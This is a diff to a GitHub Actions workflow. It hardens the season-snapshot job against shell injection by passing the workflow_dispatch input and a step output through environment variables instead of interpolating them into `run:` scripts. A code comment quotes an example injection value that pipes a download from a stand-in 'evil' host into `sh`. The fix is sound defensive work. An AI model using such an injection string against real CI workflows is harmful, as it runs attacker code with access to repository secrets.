@@ -30,15 +30,24 @@ jobs:
 
       - name: Determine season
         id: season
+        env:
+          # Passed as an env var rather than interpolated into the script
+          # text directly — workflow_dispatch input is attacker-controlled
+          # by anyone who can trigger the workflow, and a value like
+          # `"; curl evil | sh #` interpolated straight into `run:` would
+          # execute as shell before this step's own logic runs at all.
+          SEASON_INPUT: ${{ inputs.season }}
         run: |
-          SEASON="${{ inputs.season }}"
+          SEASON="$SEASON_INPUT"
           if [ -z "$SEASON" ]; then
             SEASON=$(date +%Y)
           fi
           echo "season=$SEASON" >> "$GITHUB_OUTPUT"
 
       - name: Fetch season snapshot
-        run: node scripts/snapshot-season.mjs ${{ steps.season.outputs.season }}
+        env:
+          SEASON: ${{ steps.season.outputs.season }}
+        run: node scripts/snapshot-season.mjs "$SEASON"
 
       - name: Commit snapshot
         uses: stefanzweifel/git-auto-commit-action@v5
